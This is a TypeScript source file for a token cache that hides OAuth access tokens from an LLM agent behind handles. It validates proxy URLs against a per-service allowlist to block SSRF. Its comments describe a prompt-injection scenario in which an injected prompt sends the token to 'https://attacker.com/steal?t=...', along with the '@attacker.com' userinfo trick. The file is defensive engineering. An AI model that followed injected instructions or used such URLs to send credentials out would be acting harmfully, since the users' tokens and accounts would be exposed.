/**
 * TokenCache — in-process store for short-lived delegation tokens.
 *
 * Tokens are stored here so the LLM never sees the raw access_token.
 * cred_delegate returns a handle (del_xxxx); cred_use exchanges it here
 * and makes the upstream API call on the LLM's behalf.
 *
 * SSRF protection: isAllowedUrl() validates the target URL against a
 * per-service allowlist so an injected prompt can't redirect the token
 * to an attacker-controlled server.
 */

import crypto from 'crypto';

export interface TokenEntry {
  accessToken: string;
  service: string;
  userId: string;
  expiresAt: number; // Unix ms
}

/**
 * Known safe API base URLs per service.
 * cred_use refuses to proxy requests to any URL not on this list.
 */
const SERVICE_ALLOWLIST: Record<string, string[]> = {
  google: [
    'https://www.googleapis.com/',
    'https://gmail.googleapis.com/',
    'https://calendar.googleapis.com/',
    'https://drive.googleapis.com/',
    'https://sheets.googleapis.com/',
    'https://docs.googleapis.com/',
    'https://admin.googleapis.com/',
    'https://people.googleapis.com/',
  ],
  github: [
    'https://api.github.com/',
  ],
  slack: [
    'https://slack.com/api/',
  ],
  notion: [
    'https://api.notion.com/',
  ],
  // Salesforce instance URLs vary per org (e.g. mycompany.salesforce.com)
  // We allow any HTTPS *.salesforce.com or *.force.com origin
  salesforce: [],
};

export class TokenCache {
  private readonly entries = new Map<string, TokenEntry>();
  private cleanupTimer?: ReturnType<typeof setInterval>;

  constructor() {
    // Periodic sweep for expired entries (belt-and-suspenders on top of per-entry timeouts)
    this.cleanupTimer = setInterval(() => this.sweep(), 60_000);
    if (this.cleanupTimer?.unref) this.cleanupTimer.unref();
  }

  /** Store a token and return a delegation handle */
  store(entry: TokenEntry): string {
    const id = `del_${crypto.randomBytes(10).toString('hex')}`;
    this.entries.set(id, { ...entry });

    const ttl = entry.expiresAt - Date.now();
    if (ttl > 0) {
      const t = setTimeout(() => this.entries.delete(id), ttl);
      if (t?.unref) t.unref();
    }

    return id;
  }

  /** Look up a handle. Returns a copy — callers cannot mutate the stored entry. */
  get(id: string): TokenEntry | undefined {
    const entry = this.entries.get(id);
    if (!entry) return undefined;
    if (Date.now() >= entry.expiresAt) {
      this.entries.delete(id);
      return undefined;
    }
    return { ...entry };
  }

  /** Revoke a handle early (e.g. after cred_revoke) */
  delete(id: string): boolean {
    return this.entries.delete(id);
  }

  /**
   * Validate that a URL is safe to proxy for the given service.
   *
   * Prevents SSRF: without this check, an injected prompt could craft a
   * cred_use call with url="https://attacker.com/steal?t=..." and the
   * cached token would be sent in the Authorization header.
   *
   * Uses the WHATWG URL parser throughout — no raw string matching.
   * Raw string matching is vulnerable to null bytes, tab characters,
   * and encoded separators that satisfy startsWith() but confuse fetch().
   */
  isAllowedUrl(service: string, url: string): boolean {
    // 1. Parse through WHATWG URL parser first.
    //    This rejects null bytes, control characters, and malformed URLs
    //    that could pass a naive startsWith() check.
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return false;
    }

    // 2. Protocol must be exactly https:
    if (parsed.protocol !== 'https:') return false;

    // 3. No userinfo (username/password) — rejects the @attacker.com trick
    //    even when startsWith would still match
    if (parsed.username || parsed.password) return false;

    // 4. Port must be default HTTPS (empty = 443) or explicit 443.
    //    Any other port is suspicious and not needed for public APIs.
    if (parsed.port !== '' && parsed.port !== '443') return false;

    // 5. Normalize hostname to lowercase for case-insensitive comparison
    const hostname = parsed.hostname.toLowerCase();

    if (service === 'salesforce') {
      // Salesforce: allow *.salesforce.com and *.force.com only.
      // Additionally block hostnames that look like raw IPs to prevent
      // DNS rebinding via subdomains (e.g. 192.168.1.1.salesforce.com).
      const isPrivateIpSubdomain = /^(\d{1,3}\.){3}\d{1,3}\./.test(hostname);
      if (isPrivateIpSubdomain) return false;
      return hostname.endsWith('.salesforce.com') || hostname.endsWith('.force.com');
    }

    const allowed = SERVICE_ALLOWLIST[service];
    if (!allowed) return false;

    // 6. Reconstruct a clean normalized URL from parsed components for allowlist check.
    //    This avoids matching against the raw string (which may contain control chars
    //    or encoding tricks that passed the URL parser).
    const normalizedUrl = `https://${hostname}${parsed.pathname}`;
    return allowed.some(base => normalizedUrl.startsWith(base));
  }

  /** Remove all expired entries */
  private sweep(): void {
    const now = Date.now();
    for (const [id, entry] of this.entries) {
      if (now >= entry.expiresAt) this.entries.delete(id);
    }
  }

  destroy(): void {
    if (this.cleanupTimer) clearInterval(this.cleanupTimer);
  }
}
